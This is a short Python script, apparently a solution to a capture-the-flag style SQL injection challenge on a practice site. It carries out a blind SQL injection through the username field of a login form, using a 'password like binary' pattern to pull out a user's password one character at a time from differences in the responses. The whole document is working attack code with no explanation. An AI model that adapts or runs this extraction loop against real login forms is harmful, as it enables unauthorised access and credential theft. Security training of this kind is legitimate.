import requests
import string

cookie = {'accessToken': ''}
passwd=''
while True:
    flag = False
    for c in string.printable:
        if c == '%':
            continue
        uname = '\' or password like binary "%'+c+passwd+'" #'
        print('trying '+c)
        r = requests.post('http://zadania.rozwal.to/sqli/03/', cookies=cookie, data={'username':uname, 'password':passwd})
        #print(r.text)
        if r.text.find('Złe') > 0:
            flag = True
            passwd = c+passwd
            print('Passwd: '+passwd)
            break
    if flag is False:
        break
print('Passwd: ' + passwd)
